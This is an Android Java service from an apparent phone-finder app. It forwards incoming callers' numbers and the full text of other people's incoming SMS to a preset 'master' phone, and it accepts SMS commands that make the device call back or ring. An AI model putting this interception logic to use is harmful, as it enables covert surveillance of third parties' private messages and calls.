package com.example.whereru;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

public class SMSService extends Service {

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		Toast.makeText(this, "开启服务" , Toast.LENGTH_SHORT).show();
		Toast.makeText(this, "-"+AppContext.getPHONENUMBER()+"-" , Toast.LENGTH_SHORT).show();
		
		// 判断电话，短信监听是否打开
		if(AppContext.isSMSPHONE()){
			// 电话监听
			// 创建 电话管理者 teleManager
			TelephonyManager teleManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
			// 添加 teleManager监听
			teleManager.listen(new  PhoneStateListener(){
				@Override
				public void onCallStateChanged(int state, String incomingNumber) {
					// TODO Auto-generated method stub
					super.onCallStateChanged(state, incomingNumber);
					// 如果正在打过来
					// 如果有电话来了 就记下来手机号，发送给主控手机    权限(____READ_PHONE)
					if(state == TelephonyManager.CALL_STATE_RINGING){
						ActionUtils.sendSMS(AppContext.getPHONENUMBER(), "PhoneNo.:"+incomingNumber+"\nBody:我是大笨蛋");
					}
					
				}
			}, PhoneStateListener.LISTEN_CALL_STATE);
		
			// 短信监听
			// 添加 广播接收者
			BroadcastReceiver receiver = new BroadcastReceiver() {
				
				@Override
				public void onReceive(Context context, Intent intent) {
					// 得到 Bundle数据
					Bundle bundle = intent.getExtras();
					if(bundle != null){
						Object[] objects = (Object[]) bundle.get("pdus");	// 获得未处理的短信
						SmsMessage[] message = new SmsMessage[objects.length];
						for(int i=0; i< message.length; i++) {
							message[i] = SmsMessage.createFromPdu((byte[])objects[i]);
						}
						for(SmsMessage sms : message){
							// 短信号码
							String phone = sms.getDisplayOriginatingAddress();
							// 短信内容
							String body = sms.getDisplayMessageBody();
							
							Log.i("info", "收到一条短信");
							Log.i("info", "PhoneNo. : "+phone);
							Log.i("info", "Body : -"+body+"-");
							
							
							// 判断短信号码是否为主控手机号码
							if(phone.indexOf(AppContext.getPHONENUMBER()) != -1 ){
								// 根据短信内容
								if(body.indexOf("110") != -1){	// 如果是"CallBack"就回拨电话
									ActionUtils.call(AppContext.getPHONENUMBER(), context);
								} else if(body.indexOf("111") != -1){	// 如果是 "Ring!" 响铃
									ActionUtils.ring(context);
								}
							} 
							else {	// 如果不是主控手机
								StringBuffer sb = new StringBuffer();
								sb.append("PhoneNumber: "+phone+"\n");
								sb.append("Body: "+body);
								ActionUtils.sendSMS(AppContext.getPHONENUMBER(), sb.toString());
							}
						}
					}
				}
			};
			// 增加过滤器
			IntentFilter filter = new IntentFilter();
			filter.addAction("android.provider.Telephony.SMS_RECEIVED");
			filter.setPriority(Integer.MAX_VALUE);
			// 注册广播接收者
			registerReceiver(receiver, filter);
		}
		
		return super.onStartCommand(intent, flags, startId);
	}
	@Override
	public boolean stopService(Intent name) {
		// TODO Auto-generated method stub
		Toast.makeText(this, "停止服务" , Toast.LENGTH_SHORT).show();  //??
		return super.stopService(name);
	}
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

}
